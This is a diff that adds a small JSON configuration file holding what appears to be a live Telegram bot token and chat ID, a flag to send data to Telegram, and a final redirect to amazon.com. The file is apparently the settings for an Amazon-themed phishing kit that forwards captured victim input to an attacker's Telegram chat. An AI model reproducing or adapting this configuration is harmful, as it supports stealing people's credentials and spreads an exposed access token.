@@ -1,0 +1,7 @@
+{
+  "telegram_bot_token": "8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk",
+  "telegram_chat_id": "7808815199",
+  "redirect_final": "https://www.amazon.com",
+  "default_lang": "en",
+  "kirim_ke_telegram": true
+}
